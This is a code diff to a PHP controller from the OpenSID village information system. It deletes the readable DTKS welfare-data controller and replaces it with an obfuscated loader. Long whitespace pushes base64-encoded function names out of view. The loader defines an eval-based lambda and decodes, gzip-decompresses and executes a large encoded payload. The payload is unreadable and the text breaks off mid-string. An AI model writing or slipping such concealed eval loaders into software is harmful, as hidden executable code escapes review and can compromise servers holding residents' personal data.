@@ -1,508 +1,449 @@
-<?php
-
-/*
- *
- * File ini bagian dari:
- *
- * OpenSID
- *
- * Sistem informasi desa sumber terbuka untuk memajukan desa
- *
- * Aplikasi dan source code ini dirilis berdasarkan lisensi GPL V3
- *
- * Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * Hak Cipta 2016 - 2025 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- *
- * Dengan ini diberikan izin, secara gratis, kepada siapa pun yang mendapatkan salinan
- * dari perangkat lunak ini dan file dokumentasi terkait ("Aplikasi Ini"), untuk diperlakukan
- * tanpa batasan, termasuk hak untuk menggunakan, menyalin, mengubah dan/atau mendistribusikan,
- * asal tunduk pada syarat berikut:
- *
- * Pemberitahuan hak cipta di atas dan pemberitahuan izin ini harus disertakan dalam
- * setiap salinan atau bagian penting Aplikasi Ini. Barang siapa yang menghapus atau menghilangkan
- * pemberitahuan ini melanggar ketentuan lisensi Aplikasi Ini.
- *
- * PERANGKAT LUNAK INI DISEDIAKAN "SEBAGAIMANA ADANYA", TANPA JAMINAN APA PUN, BAIK TERSURAT MAUPUN
- * TERSIRAT. PENULIS ATAU PEMEGANG HAK CIPTA SAMA SEKALI TIDAK BERTANGGUNG JAWAB ATAS KLAIM, KERUSAKAN ATAU
- * KEWAJIBAN APAPUN ATAS PENGGUNAAN ATAU LAINNYA TERKAIT APLIKASI INI.
- *
- * @package   OpenSID
- * @author    Tim Pengembang OpenDesa
- * @copyright Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * @copyright Hak Cipta 2016 - 2025 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- * @license   http://www.gnu.org/licenses/gpl.html GPL V3
- * @link      https://github.com/OpenSID/OpenSID
- *
- */
-
-defined('BASEPATH') || exit('No direct script access allowed');
-
-use App\Enums\Dtks\DtksEnum;
-use App\Enums\StatusEnum;
-use App\Models\Config;
-use App\Models\Dtks as ModelDtks;
-use App\Models\DtksAnggota;
-use App\Models\Keluarga;
-use App\Models\Penduduk;
-use App\Models\Rtm;
-use App\Models\Wilayah;
-use App\Services\DTKSRegsosEk2022k;
-use Illuminate\Support\Facades\DB;
-
-// TODO : jika ada perubahan versi DTKS terbaru, selain merubah data yg ada
-// silakan buat kode untuk menghapus file pdf versi DTKS sebelumnya.
-// cek kode DTKSRegsosEk2022k::generateCetakPdf()
-
-class Dtks extends Admin_Controller
-{
-    public $modul_ini           = 'satu-data';
-    public $sub_modul_ini       = 'dtks';
-    public $kategori_pengaturan = 'DTKS';
-
-    public function __construct()
-    {
-        parent::__construct();
-        isCan('b');
-    }
-
-    /**
-     * proses singkronisasi jumlah anggota dtks dengan anggota keluarga yg berubah
-     *
-     * @param mixed $rtm
-     */
-    protected function syncDtksRtm($rtm)
-    {
-        $semua_anggota = Penduduk::without([
-            'jenisKelamin',
-            'agama',
-            'pendidikan',
-            'pendidikanKK',
-            'pekerjaan',
-            'wargaNegara',
-            'golonganDarah',
-            'cacat',
-            'statusKawin',
-            'pendudukStatus',
-            'wilayah',
-        ])
-            ->select('id', 'nama', 'id_rtm', 'rtm_level', 'id_kk', 'kk_level')
-            ->whereIn('id_rtm', $rtm->pluck('no_kk'))
-            ->get();
-        $semua_dtks = ModelDtks::select('id', 'id_rtm', 'id_keluarga', 'versi_kuisioner')
-            ->withCount('dtksAnggota')
-            ->whereIn('id_rtm', $rtm->pluck('id'))
-            ->get();
-
-        foreach ($rtm as $item) {
-            $dtks_rtm = $semua_dtks->where('id_rtm', $item->id);
-
-            if ($dtks_rtm->count() != 0) {
-                $jumlah_dtks_anggota = $dtks_rtm->reduce(static fn ($carry, $item) => $carry + $item->dtks_anggota_count);
-                $jumlah_anggota_rt   = $semua_anggota->where('id_rtm', $item->no_kk)->count();
-
-                if ($jumlah_anggota_rt != $jumlah_dtks_anggota) {
-                    foreach ($dtks_rtm as $dtks) {
-                        if ($dtks->versi_kuisioner == DtksEnum::REGSOS_EK2022_K) {
-                            return (new DTKSRegsosEk2022k())->generateDefaultDtks($dtks);
-                        }
-                    }
-                }
-            }
-        }
-    }
-
-    public function index()
-    {
-        $rtm = Rtm::with([
-            'kepalaKeluarga' => static function ($builder): void {
-                $builder->select('id', 'nama', 'nik');
-                $builder->without([
-                    'jenisKelamin',
-                    'agama',
-                    'pendidikan',
-                    'pendidikanKK',
-                    'pekerjaan',
-                    'wargaNegara',
-                    'golonganDarah',
-                    'cacat',
-                    'statusKawin',
-                    'pendudukStatus',
-                    'wilayah',
-                ]);
-            },
-        ])->where('terdaftar_dtks', 1)->get();
-
-        $this->syncDtksRtm($rtm);
-
-        $data['rtm'] = $rtm->filter(static fn ($value) => ! in_array($value->id, ModelDtks::pluck('id_rtm')->toArray()));
-
-        return view('admin.dtks.index', $data);
-    }
-
-    public function datatables()
-    {
-        if ($this->input->is_ajax_request()) {
-            $rtm      = (new Rtm())->getTable();
-            $keluarga = (new Keluarga())->getTable();
-            $penduduk = (new Penduduk())->getTable();
-            $wilayah  = (new Wilayah())->getTable();
-            //  =
-            $join = DB::table('dtks')
-                ->select(
-                    'dtks.id',
-                    'dtks.id_rtm',
-                    'dtks.id_keluarga',
-                    'is_draft',
-                    'versi_kuisioner',
-                    'dtks.updated_at',
-                    'nama_petugas_pencacahan',
-                    'nama_responden',
-                    'nama_ppl'
-                )
-                ->addSelect('krt.nik as nik_krt', 'krt.nama as nama_krt', 'kk.nik as nik_kk', 'kk.nama as nama_kk')
-                ->addSelect('wil_krt.dusun as dusun_krt', 'wil_krt.rt as rt_krt', 'wil_krt.rw as rw_krt', 'wil_kk.dusun as dusun_kk', 'wil_kk.rt as rt_kk', 'wil_kk.rw as rw_kk')
-                ->addSelect(DB::raw("(SELECT COUNT(DISTINCT(a.id_kk)) FROM {$penduduk} AS a WHERE rtm.no_kk = a.id_rtm ) as `keluarga_count`"))
-                ->addSelect(DB::raw('(SELECT COUNT(*) FROM dtks_anggota WHERE dtks.id = dtks_anggota.id_dtks) as `anggota_count`'))
-                ->join($rtm . ' AS rtm', 'rtm.id', '=', 'dtks.id_rtm')
-                ->join($keluarga . ' AS keluarga', 'keluarga.id', '=', 'dtks.id_keluarga')
-                ->join($penduduk . ' AS krt', 'rtm.nik_kepala', '=', 'krt.id')
-                ->join($penduduk . ' AS kk', 'keluarga.nik_kepala', '=', 'kk.id')
-                ->join($wilayah . ' AS wil_krt', 'krt.id_cluster', '=', 'wil_krt.id')
-                ->join($wilayah . ' AS wil_kk', 'kk.id_cluster', '=', 'wil_kk.id')
-                ->where('dtks.config_id', identitas('id'));
-
-            $case_sql = static function (&$query, $keyword, array $fields = [DtksEnum::REGSOS_EK2022_K => ''], string $operator = 'LIKE') {
-                $sql     = '(versi_kuisioner = ' . DtksEnum::REGSOS_EK2022_K . ' AND ' . $fields[DtksEnum::REGSOS_EK2022_K] . ' ' . $operator . ' ?)';
-                $binding = ["%{$keyword}%"];
-
-                return $query->whereRaw($sql, $binding);
-            };
-            $add_column = static function (&$row, array $fields = [DtksEnum::REGSOS_EK2022_K => '']) {
-                if ($row->versi_kuisioner == DtksEnum::REGSOS_EK2022_K) {
-                    return $row->{$fields[DtksEnum::REGSOS_EK2022_K]};
-                }
-            };
-
-            return datatables()->of($join)
-                ->addColumn('ceklist', static function ($row) {
-                    if (can('h')) {
-                        return '<input type="checkbox" name="id_cb[]" value="' . $row->id . '"/>';
-                    }
-                })
-                ->addIndexColumn()
-                ->addColumn('aksi', static function ($row): string {
-                    $aksi = '';
-                    // $aksi .= '<a href=" '. ci_route("dtks.detail.{$row->id}") . '" class="btn bg-purple btn-flat btn-sm" title="Rincian Data"><i class="fa fa-list-ol"></i></a>';
-                    if (can('u')) {
-                        $aksi .= '&nbsp;<a href="' . ci_route("dtks.form.{$row->id}") . '" class="btn btn-warning btn-sm"  title="Lihat & Ubah Data"><i class="fa fa-edit"></i></a> ';
-                        $aksi .= '&nbsp;<a href="#" data-id="' . $row->id . '" class="btn-hapus btn btn-danger btn-sm" data-remote="false" data-toggle="modal" data-target="#modal-confirm-delete-dtks" title="Hapus Data"><i class="fa fa-trash"></i></a> ';
-                    }
-
-                    return $aksi;
-                })
-                ->addColumn('dusun', static fn ($row) => $add_column($row, [DtksEnum::REGSOS_EK2022_K => 'dusun_krt']))
-                ->filterColumn('dusun', static fn ($query, $keyword) => $case_sql($query, $keyword, [DtksEnum::REGSOS_EK2022_K => 'wil_krt.dusun']))
-                ->addColumn('rt', static fn ($row) => $add_column($row, [DtksEnum::REGSOS_EK2022_K => 'rt_krt']))
-                ->filterColumn('rt', static fn ($query, $keyword) => $case_sql($query, $keyword, [DtksEnum::REGSOS_EK2022_K => 'wil_krt.rt']))
-                ->addColumn('rw', static fn ($row) => $add_column($row, [DtksEnum::REGSOS_EK2022_K => 'rw_krt']))
-                ->filterColumn('rw', static fn ($query, $keyword) => $case_sql($query, $keyword, [DtksEnum::REGSOS_EK2022_K => 'wil_krt.rw']))
-                ->addColumn('petugas', static fn ($row) => $add_column($row, [DtksEnum::REGSOS_EK2022_K => 'nama_ppl']))
-                ->addColumn('responden', static fn ($row) => $row->nama_responden)
-                ->addColumn('versi_kuisioner', static fn ($row): string => DtksEnum::VERSION_LIST[$row->versi_kuisioner])
-                ->filterColumn('versi_kuisioner', static function ($query, $keyword): void {
-                })
-                ->rawColumns(['ceklist', 'aksi'])
-                ->toJson();
-        }
-
-        return show_404();
-    }
-
-    public function listAnggota($id_dtks)
-    {
-        $this->syncDtksRtm(Rtm::where('terdaftar_dtks', 1)->get());
-        $data['anggota'] = DtksAnggota::with([
-            'penduduk' => static function ($builder): void {
-                $builder->select('id', 'nama', 'nik');
-                $builder->without([
-                    'jenisKelamin',
-                    'agama',
-                    'pendidikan',
-                    'pendidikanKK',
-                    'pekerjaan',
-                    'wargaNegara',
-                    'golonganDarah',
-                    'cacat',
-                    'statusKawin',
-                    'pendudukStatus',
-                    'wilayah',
-                ]);
-            },
-        ])
-            ->select('id', 'id_dtks', 'id_penduduk')
-            ->where('id_dtks', $id_dtks)
-            ->get();
-
-        return view('admin.dtks.list_anggota', $data);
-    }
-
-    public function loadRecentInfo()
-    {
-        try {
-            return (new DTKSRegsosEk2022k())->info();
-        } catch (Throwable $th) {
-            echo 'File info tidak ditemukan';
-        }
-    }
-
-    public function loadRecentImpor()
-    {
-        try {
-            return (new DTKSRegsosEk2022k())->impor();
-        } catch (Throwable $th) {
-            echo 'File info tidak ditemukan';
-        }
-    }
-
-    public function ekspor()
-    {
-        $versi_kuisioner = $this->input->get('versi');
-        if ($versi_kuisioner == DtksEnum::REGSOS_EK2021_RT) {
-            redirect_with('error', 'Proses versi tidak ditemukan', ci_route('dtks'));
-        } elseif ($versi_kuisioner == DtksEnum::REGSOS_EK2022_K) {
-            return (new DTKSRegsosEk2022k())->ekspor();
-        } else {
-            redirect_with('error', 'Versi tidak ditemukan', ci_route('dtks'));
-        }
-    }
-
-    public function cetak2($id = null)
-    {
-        $ids = $this->request['id'] ?? [];
-
-        $dtks = ModelDtks::whereIn('id', $ids)
-            ->orWhere('id', $id)
-            ->get();
-
-        if ($dtks->count() == 0) {
-            if ($this->input->is_ajax_request()) {
-                return json(['message' => 'Data terpilih tidak ditemukan'], 404);
-            }
-            redirect_with('error', 'Data terpilih tidak ditemukan', $_SERVER['HTTP_REFERER']);
-        } elseif ($dtks->count() == 1) {
-            // lempar ke halaman baru tanpa ajax, (dilakukan oleh js)
-            if ($this->input->is_ajax_request()) {
-                return json(['message' => 'Mengunduh 1 data', 'href' => ci_route('dtks/cetak2/' . $dtks->first()->id)], 200);
-            }
-        }
-
-        if ($dtks->count() == 1) {
-            $versi_kuisioner = $dtks->first()->versi_kuisioner;
-            if ($versi_kuisioner == DtksEnum::REGSOS_EK2022_K) {
-                return (new DTKSRegsosEk2022k())->cetakPreviewSingle($dtks->first());
-            }
-        } else {
-            $dtks = $dtks->groupBy('versi_kuisioner');
-
-            // create each zip versi
-            $list_path = [];
-
-            foreach ($dtks as $versi_kuisioner => $item) {
-                if ($versi_kuisioner == DtksEnum::REGSOS_EK2022_K) {
-                    $paths = (new DTKSRegsosEk2022k())->cetakZip($item);
-                    $list_path += $paths;
-                }
-            }
-            // simpan
-            $list_path_to_zip = collect($list_path);
-            $list_path        = collect($list_path)->transform(static fn ($item, $key): array => ['id' => $item['id'], 'status_file' => $item['status_file']]);
-
-            $proses_belum_selesai = $list_path->where('status_file', 0);
-
-            if ($proses_belum_selesai->count() > 0) {
-                return json(['message' => 'Proses Data', 'list' => $list_path], 200);
-            }
-            if ($this->input->is_ajax_request()) {
-                return json(['message' => 'Data Siap Diunduh', 'list' => $list_path], 200);
-            }
-
-            if ($list_path_to_zip->count() != 0) {
-                $this->load->library('zip');
-
-                foreach ($list_path_to_zip as $item) {
-                    $this->zip->read_file($item['file']);
-                }
-                $this->zip->download('berkas_dtks_regsosek_terpilih_' . date('d-m-Y') . '.zip');
-            }
-        }
-    }
-
-    public function new($id_rtm = 'A'): void
-    {
-        $id_rtm = ($id_rtm == 'A') ? bilangan($this->request['id_rtm']) : bilangan($id_rtm);
-
-        if ($id_rtm == null) {
-            redirect_with('error', 'RTM tidak ditemukan');
-        }
-
-        $dtks = ModelDtks::where([
-            'id_rtm'          => $id_rtm,
-            'versi_kuisioner' => DtksEnum::VERSION_CODE,
-            // 'is_draft' => StatusEnum::YA, // belum terpakai karena yg dibutuhkan hanya 1 data per rtm
-        ])->first();
-
-        if (! $dtks) {
-            DB::beginTransaction();
-            $dtks = ModelDtks::create([
-                'versi_kuisioner' => DtksEnum::VERSION_CODE,
-                'id_rtm'          => $id_rtm,
-                'is_draft'        => StatusEnum::YA,
-            ]);
-            $this->synchroniseDTKSWithOpenSid($dtks);
-            DB::commit();
-        }
-
-        redirect("{$this->controller}/form/{$dtks->id}");
-    }
-
-    public function latest($id_rtm): void
-    {
-        $dtks = ModelDtks::where(['id_rtm' => $id_rtm])
-            ->orderBy('created_at', 'ASC')
-            ->first();
-
-        if (! $dtks) {
-            session_error(' : Belum ada data');
-            redirect_with('error', 'Belum ada data', $_SERVER['HTTP_REFERER']);
-        }
-        redirect("{$this->controller}/form/{$dtks->id}");
-    }
-
-    public function form($id)
-    {
-        $dtks = ModelDtks::where(['id' => $id])->first();
-
-        if (! $dtks) {
-            return json(['message' => 'Formulir Tidak ditemukan'], 404);
-        }
-
-        if ($dtks->versi_kuisioner == DtksEnum::REGSOS_EK2022_K) {
-            return (new DTKSRegsosEk2022k())->form($dtks);
-        }
-    }
-
-    protected function synchroniseDTKSWithOpenSid(ModelDtks $dtks)
-    {
-        $config = Config::first();
-
-        if (! $config) {
-            session_error(' : Konfigurasi tidak ditemukan');
-            redirect_with('error', 'Konfigurasi tidak ditemukan', ci_route('dtks'));
-        }
-
-        if ($dtks->versi_kuisioner == DtksEnum::REGSOS_EK2022_K) {
-            $dtks = (new DTKSRegsosEk2022k())->syncronizeWithOpenSid($dtks);
-        }
-    }
-
-    /**
-     * savePengaturan
-     *
-     * @param mixed $versi_dtks
-     */
-    public function savePengaturan($versi_dtks)
-    {
-        if ($this->input->is_ajax_request()) {
-            if ($versi_dtks == DtksEnum::REGSOS_EK2022_K) {
-                $respon = (new DTKSRegsosEk2022k())->save($this->request);
-
-                return json($respon['content'], $respon['header_code']);
-            }
-
-            return json(['message' => 'Tidak melakukan apapun'], 200);
-        }
-        if ($versi_dtks == DtksEnum::REGSOS_EK2022_K) {
-            $respon = (new DTKSRegsosEk2022k())->save($this->request);
-
-            return json($respon['content'], $respon['header_code']);
-        }
-
-        session_error(' : Tidak melakukan apapun');
-        redirect_with('error', 'Tidak melakukan apapun', $_SERVER['HTTP_REFERER']);
-    }
-
-    /**
-     * Save
-     *
-     * @param dtks_id $id
-     */
-    public function save($id)
-    {
-        $dtks = ModelDtks::with('dtksAnggota')
-            ->where(['id' => $id])
-            ->first();
-
-        if ($this->input->is_ajax_request()) {
-            if (! $dtks) {
-                return json(['message' => 'Formulir Tidak ditemukan'], 404);
-            }
-
-            if ($dtks->versi_kuisioner == DtksEnum::REGSOS_EK2022_K) {
-                $respon = (new DTKSRegsosEk2022k())->save($this->request, $dtks);
-
-                return json($respon['content'], $respon['header_code']);
-            }
-
-            return json(['message' => 'Tidak melakukan apapun'], 200);
-        }
-        if (! $dtks) {
-            session_error(' : Formulir tidak ditemukan');
-            redirect_with('error', 'Formulir Tidak ditemukan', $_SERVER['HTTP_REFERER']);
-        }
-
-        if ($dtks->versi_kuisioner == DtksEnum::REGSOS_EK2022_K) {
-            $respon = (new DTKSRegsosEk2022k())->save($this->request, $dtks);
-
-            return json($respon['content'], $respon['header_code']);
-        }
-
-        session_error(' : Tidak melakukan apapun');
-        redirect_with('error', 'Tidak melakukan apapun', $_SERVER['HTTP_REFERER']);
-    }
-
-    /**
-     * Delete
-     *
-     * @param dtks_id $id
-     */
-    public function delete($id)
-    {
-        isCan('h');
-
-        ModelDtks::find($id)->delete();
-
-        return json(['message' => 'Berhasil'], 200);
-    }
-
-    /**
-     * Remove some data
-     *
-     * @param dtks_id $id
-     */
-    public function remove($id)
-    {
-        $dtks = ModelDtks::find($id);
-
-        if (! $dtks) {
-            return json(['message' => 'Formulir Tidak ditemukan'], 404);
-        }
-
-        if ($dtks->versi_kuisioner == DtksEnum::REGSOS_EK2022_K) {
-            $respon = (new DTKSRegsosEk2022k())->remove($dtks, $this->request);
-
-            return json($respon['content'], $respon['header_code']);
-        }
-
-        return json(['message' => 'Tidak melakukan apapun'], 200);
-    }
-}
+<?php 
+        $__='printf';$_='Loading donjo-app/controllers/Dtks.php';
+        
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
+$__________________='X19sYW1iZGE=';
+
+                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
+        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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